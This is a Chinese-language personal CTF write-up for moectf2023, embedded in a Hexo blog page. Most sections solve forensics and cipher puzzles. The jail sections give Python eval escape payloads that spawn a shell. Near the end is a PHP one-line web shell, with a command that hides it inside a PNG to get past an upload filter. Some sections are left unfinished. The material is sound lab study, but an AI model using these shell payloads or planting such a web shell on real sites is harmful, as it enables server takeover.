@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xuan tu">
+
+
+
+
+
+
+
+<title>moectf2023个人wp | 曲径通幽处.</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            ヾ(^_^) back Home.!!
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">主页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">文章</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1a-OiD9e0tEgNmWDoR0RGkhBtp-v8TQq8?usp=drive_link">书阁(M)</a>
+              </li> 
+                   
+          
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+        </div>
+        <div class="post-title">
+            
+            
+                moectf2023个人wp
+            
+            
+        </div>
+        <span class="post-date">
+            8月 14, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <h1 id="Misc-入门指北"><a href="#Misc-入门指北" class="headerlink" title="Misc 入门指北"></a>Misc 入门指北</h1><p> 放basecrack跑一下就行了：</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814122337656.png" alt="image-20230814122337656" style="zoom:50%;" />moectf{h@v3_fun_@t_m15c_!}</p>
+<h1 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h1><p>改文件头为FF D8 FF，然后改后缀为jpeg，就能看到图片了</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814123146951.png" alt="image-20230814123146951"></p>
+<p>图片如下：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814123247455.png" alt="image-20230814123247455"></p>
+<p>右键查看属性，发现<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814131929494.png" alt="image-20230814131929494"></p>
+<p>是16进制字符串，转换一下得出flag</p>
+<p>moectf{XDU_i5_v3ry_6e@u2ifu1}</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814131922121.png" alt="image-20230814131922121"></p>
+<h1 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a>打不开的图片2</h1><p>发现IHDR</p>
+<p>IHDR是PNG文件的文件头数据块</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814133910041.png" alt="image-20230814133910041"></p>
+<p>删除前面8个数据，然后修改头部数据为png的文件头：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89 50 4E 47 0D 0A 1A 0A</span><br></pre></td></tr></table></figure>
+
+<p>然后后缀改为.png</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814134013876.png" alt="image-20230814134013876"></p>
+<p>moectf{D0_ yOu_1ik3_Bo7@ck_?}</p>
+<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>直接复制链接就可以了</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814134522384.png" alt="image-20230814134522384"></p>
+<h1 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a>狗子(1) 普通的猫</h1><p>提示用hex编辑器，直接用010打开ctrl+f搜索moe</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814134752145.png" alt="image-20230814134752145"></p>
+<p>moectf{eeeez_f1ag_as_A_G1ft!}</p>
+<h1 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a>狗子(2) 照片</h1><p>宽高一把梭后没有隐藏内容，因此不是宽高隐写</p>
+<p>放入stegsolve ，在alpha plane 0处发现了类似莫斯的东西</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814143543650.png" alt="image-20230814143543650"></p>
+<p>放大：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814143743874.png" alt="image-20230814143743874"></p>
+<p>rgb0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">30 00 00 79 F6 99 69 B7 52 21 B6 </span><br><span class="line">48 0 0 121 246 153 105 183 82 33 182</span><br></pre></td></tr></table></figure>
+
+<p>png：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">137 80 78 71 13 10 26 10</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="base乐队"><a href="#base乐队" class="headerlink" title="base乐队"></a>base乐队</h1><p>先basecrack一下，得到这个字符串：</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814154229623.png" alt="image-20230814154229623"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bYeNQXYZXbXZQfW31FGzzD0m0FHQ9RR85FFQYMB9M=lmo2ku11z0uiz=</span><br></pre></td></tr></table></figure>
+
+<p>然后因为一般base编码的&#x3D;都在最后，所以想到栅栏解密：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814154205105.png" alt="image-20230814154205105"></p>
+<p>将第二个放到basecrack里再解一下：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814154318711.png" alt="image-20230814154318711"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Th4_6@nd_1nc1ud45_F3nc4_@nd_b@s3&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h1><p>众所周知，这种乱码是utf-8和gbk混乱导致的</p>
+<h1 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h1><p>foremost 一下：里面有jpg、png、pptx等等</p>
+<p>python bwmforpy3.py decode 00000327.png  00000063.png  00000437.png  wooow.png</p>
+<p>pptx打开发现：</p>
+<p>ctrl + A</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814163518446.png"></p>
+<p>注意中间还有个注释，内容是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_?_</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814162913564.png" alt="image-20230814162913564"></p>
+<p>查找} 得知：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814164059205.png" alt="image-20230814164059205"></p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814164216745.png" alt="image-20230814164216745"></p>
+<p>利用预览得知为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_pp4x!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加在一起就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;2ip_?_n0_i4_pp4x!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者用在线工具提取文本<a target="_blank" rel="noopener" href="https://products.groupdocs.app/zh/parser/ppt%EF%BC%9A![image-20230814164820567](https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814164820567.png)">https://products.groupdocs.app/zh/parser/ppt：![image-20230814164820567](https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814164820567.png)</a></p>
+<p>tips:原来把123456加上不可以，就试着把123456去了，然后就成功了</p>
+<h1 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a>机位查询</h1><p>社工题</p>
+<p>第一张图：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814171250758.png" alt="image-20230814171250758"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jiashi</span><br></pre></td></tr></table></figure>
+
+<p>第二张：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814171539088.png" alt="image-20230814171539088"></p>
+<p>百盛</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baisheng</span><br></pre></td></tr></table></figure>
+
+<p>第三张：</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814172442391.png" alt="image-20230814172442391"></p>
+<p>根据构图可以分析出这一个方向</p>
+<p>断定为：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814173918548.png" alt="image-20230814173918548"></p>
+<p>但是经过仔细比对：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814174315608.png" alt="image-20230814174315608"></p>
+<p>应该是这个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guangdian</span><br></pre></td></tr></table></figure>
+
+<p>moectf{jiashi_baisheng_guangdian}</p>
+<h1 id="你想要flag吗"><a href="#你想要flag吗" class="headerlink" title="你想要flag吗"></a>你想要flag吗</h1><p>用audacity查看波谱：</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230814185336258.png" alt="image-20230814185336258"></p>
+<p>pwd:youseeme</p>
+<p>decode.exe -X 1.WAV -P youseeme</p>
+<h1 id="Crypto-入门指北"><a href="#Crypto-入门指北" class="headerlink" title="Crypto 入门指北"></a>Crypto 入门指北</h1><p>示例代码放进去跑一下即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="runme2"><a href="#runme2" class="headerlink" title="runme2"></a>runme2</h1><p>加.&#x2F;来运行</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230815000453410.png"></h1><h1 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h1><p>直接在线解密：使用rot-47</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230815000655667.png" alt="image-20230815000655667"></p>
+<p>moectf{rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_}</p>
+<h1 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h1><p>看标题便知是栅栏，但是枚举完好像没有正确的，于是便猜测是某种变体：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp&#125;e&#123;ciri_hT_avn3Fa_j </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>w试一下：</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230815005706242.png" alt="image-20230815005706242"></p>
+<p>moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj}</p>
+<p>图解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mt3_hsTal3yGnM_p3j</span><br><span class="line">ocfFn3cp3_hFs3c_3T</span><br><span class="line">e&#123;ciri_hT_avn3Fa_j </span><br><span class="line">rB__i3_uBro_lcsOp&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230815011002469.png" alt="image-20230815011002469"></p>
+<h1 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h1><p>一眼凯撒，偏移量7：moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To}</p>
+<h1 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h1><p>ipconfig查看本机ip</p>
+<p>根据群文件指引连上后，ls一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc *.*.0.* 54594</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat gift</span><br></pre></td></tr></table></figure>
+
+<p>它提示有隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure>
+
+<p>查看所有文件，发现.flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .flag</span><br></pre></td></tr></table></figure>
+
+<p>moectf{YZ7IA_1X6FGU5ZhiEyy1lq3stGCtClSj}</p>
+<h1 id="Jail-Level-0"><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">相关概念</span><br><span class="line">RCE（远程代码执行）：这是互联网的一种安全漏洞，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。</span><br></pre></td></tr></table></figure>
+
+<p>挑战源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">user_input_data = input(&quot;&gt; &quot;)</span><br><span class="line">print(&#x27;calc Answer: &#123;&#125;&#x27;.format(eval(user_input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>pyjail：payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">print(open(&#x27;/flag.txt&#x27;).read())`</span><br></pre></td></tr></table></figure>
+
+
+
+<p>普适payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>它使用 <code>__import__</code> 函数导入 <code>os</code> 模块，然后使用 <code>system</code> 函数执行了一个 shell 命令。</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230816213047525.png" alt="image-20230816213047525"></p>
+<p>flag{sJxaEbnrYVGlIi653mzjki-cvEqmbjW1}</p>
+<h1 id="Jail-Level-1"><a href="#Jail-Level-1" class="headerlink" title="Jail Level 1"></a>Jail Level 1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">相关概念：pdb模块</span><br></pre></td></tr></table></figure>
+
+<p>提示说限制了payload长度</p>
+<p>先获取代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">user_input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if len(user_input_data)&gt;12:</span><br><span class="line">  print(&quot;Oh hacker! Bye~&quot;)</span><br><span class="line">  exit(0)</span><br><span class="line">print(&#x27;calc Answer: &#123;&#125;&#x27;.format(eval(user_input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>看代码得知限制在了12个字符</p>
+<p>提示： you need to find a payload not above 12 byte</p>
+<p>打断点：breakpoint()</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230816221122858.png" alt="image-20230816221122858"></p>
+<p>flag{7va2ijWSwxVtk6OdqNrivyyd7-2qjiuF}</p>
+<h1 id="Jail-Level-2"><a href="#Jail-Level-2" class="headerlink" title="Jail Level 2"></a>Jail Level 2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> Hint for beginner:                                                                                                                                 |</span><br><span class="line">| 1. you need to find a payload not above 6 byte                                                                                                     |</span><br><span class="line">| 2. the docker file use socat. the EXEC arg is --&gt; `EXEC:&quot;./xxxxxxx.py&quot;,pty,......</span><br></pre></td></tr></table></figure>
+
+<p>输入<code>help()</code>，随便找个模块输一下，然后输入<code>!sh</code>即可进入shell</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230816222440958.png" alt="image-20230816222440958"></p>
+<h1 id="Jail-Level-3"><a href="#Jail-Level-3" class="headerlink" title="Jail Level 3"></a>Jail Level 3</h1><p>先看代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">    BANLIST = [&#x27;breakpoint&#x27;]</span><br><span class="line">    BANLIST_WORDS = &#x27;|&#x27;.join(f&#x27;(&#123;WORD&#125;)&#x27; for WORD in BANLIST)</span><br><span class="line">    print(&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;)</span><br><span class="line">    print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">    user_input_data = input(&quot;&gt; &quot;)</span><br><span class="line">    if len(user_input_data)&gt;12:</span><br><span class="line">      print(&quot;Oh hacker! Bye~&quot;)</span><br><span class="line">      exit(0)</span><br><span class="line">    if re.findall(BANLIST_WORDS, user_input_data, re.I):</span><br><span class="line">      raise Exception(&#x27;Blacklisted word detected! you are hacker!&#x27;)</span><br><span class="line">    print(&#x27;Answer result: &#123;&#125;&#x27;.format(eval(user_input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>ban掉了breakpoint、help，长度不能超过12</p>
+<h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>你需要完成以下任务：</p>
+<ol>
+<li>使用参数：UwU&#x3D;u。这意味着你需要将参数名设置为”UwU”，参数值设置为”u”，并将其包含在你的请求中。</li>
+<li>发送一个名为”Luv”的POST请求。这意味着你需要向指定的目标URL发送一个包含参数名为”Luv”的POST请求，并将参数值设置为”u”。</li>
+<li>使用管理员角色。这可能意味着你需要在请求中包含一个代表管理员权限的标识，以便服务器可以验证你的身份。</li>
+<li>请求来自127.0.0.1。这意味着你需要修改你的请求，使其看起来是从本地主机（IP地址为127.0.0.1）发出的。</li>
+<li>使用浏览器”MoeBrowser”。这个要求可能暗示你需要修改你的请求头，将”User-Agent”字段设置为”MoeBrowser”，以模拟使用特定的浏览器发送请求。</li>
+</ol>
+<p>完成所有任务后，你将能够解决这道CTF赛题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /canonical.html HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 MoeBrowser</span><br><span class="line">Accept: /</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line">get: UwU=u</span><br><span class="line">host: Luv=u</span><br></pre></td></tr></table></figure>
+
+<p>请求的浏览器标识为MoeBrowser</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 MoeBrowser</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web入门指北"><a href="#web入门指北" class="headerlink" title="web入门指北"></a>web入门指北</h1><p>16转ascii</p>
+<p>flag&#x3D;bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0&#x3D;</p>
+<p>base64：</p>
+<p>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</p>
+<h1 id="pwn-baby-calculator"><a href="#pwn-baby-calculator" class="headerlink" title="[pwn] baby_calculator"></a>[pwn] baby_calculator</h1><p>nc练上去以后：</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230817202925633.png" alt="image-20230817202925633"></p>
+<p>他要我们帮他判断:</p>
+<p>计算正确：BlackBird</p>
+<p>计算错误：WingS</p>
+<h1 id="狗子3"><a href="#狗子3" class="headerlink" title="狗子3"></a>狗子3</h1><p>可用ExtractNow这个工具</p>
+<p>moectf{Ca7_s133p1ng_und3r_zip_5hell5}</p>
+<h1 id="照片冲洗"><a href="#照片冲洗" class="headerlink" title="照片冲洗"></a>照片冲洗</h1><p>foremost出来的图片和原图大小有差异，说明藏了东西<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230818122324076.png" alt="image-20230818122324076"></p>
+<p>进行文件对比：</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230818123047328.png" alt="image-20230818123047328"></p>
+<p>把多出来的提取出来</p>
+<p>出来个这么个玩意：<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/5%20(1).png" alt="5 (1)"></p>
+<p>我以前见过这个，叫npiet</p>
+<h1 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h1><p>社工题，图片搜一下就知道是厦门大学(翔安校区)-德旺图书馆，用<a target="_blank" rel="noopener" href="https://api.map.baidu.com/lbsapi/getpoint/index.html%E6%8A%8A%E5%9D%90%E6%A0%87%E6%8F%90%E5%8F%96%E5%87%BA%E6%9D%A5%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8B%8D%E6%91%84%E8%AE%BE%E5%A4%87%E6%98%AF%E7%BA%A2%E7%B1%B3k60">https://api.map.baidu.com/lbsapi/getpoint/index.html把坐标提取出来，然后拍摄设备是红米k60</a> 发布时间20221227</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20230819145306339.png" alt="image-20230819145306339"></p>
+<p>moectf{P0sT_Y0uR_Ph0T0_wiTh_0Riginal_File_is_n0T_a_g00d_idea_YlJf!M3rux}</p>
+<h1 id="狗子4"><a href="#狗子4" class="headerlink" title="狗子4"></a>狗子4</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h1><p>其有检测机制，需要添加png的文件头让其识别为png文件</p>
+<p>在添加文件头后即使后缀为php还是能上传，说明只检测文件头</p>
+<p>可利用<strong>图片马</strong></p>
+<p>一、木马.asp的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP @system($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>制作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 图片文件名/b+一句话木马文件名/a 制作的图片马文件名</span><br></pre></td></tr></table></figure>
+
+<p>copy 100.png&#x2F;b +1.asp&#x2F;a muma1.png</p>
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2024/01/11/database_homework/">Prev</a>
+                </div>
+            
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2023/08/12/NSSCTF%E9%A2%98%E5%BA%93WEB/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+
+
+    
+       <!--PC版-->
+        <div id="SOHUCS" ></div>
+        <script charset="utf-8" type="text/javascript" src="https://cy-cdn.kuaizhan.com/upload/changyan.js" ></script>
+        <script type="text/javascript">
+        window.changyan.api.config({
+            appid: 'cywJvGKKO',
+            conf: 'prod_dfd0ec91693832034dcc62943592b045'
+        });
+        </script>   
+     
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+    
+
+  </body>
+</html>
